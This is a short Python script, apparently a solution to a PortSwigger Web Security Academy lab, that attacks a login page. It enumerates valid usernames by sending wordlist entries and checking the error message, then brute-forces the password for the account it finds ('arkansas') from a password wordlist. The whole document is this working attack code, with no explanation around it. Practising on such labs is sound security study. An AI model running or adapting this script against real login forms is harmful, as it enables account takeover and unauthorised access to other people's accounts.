from getpass import getpass
import requests 

url = 'https://ac031f3d1e6d55d2c02d792600320052.web-security-academy.net/login'

def getUsername():
    usernames = open('../../wordlist/username.txt')

    for username in usernames:
        response = requests.post(url, data={
            'username': username.replace('\n', ''),
            'password': 'whatever'
        })

        if 'Invalid username' not in response.text:
            print(username)
            break

def getPassword():
    passwords = open('../../wordlist/password.txt')

    for password in passwords:
        response = requests.post(url, data={
            'username': 'arkansas',
            'password': password.replace('\n', '')
        })

        if 'Incorrect password' not in response.text:
            print(password)
            break

getPassword()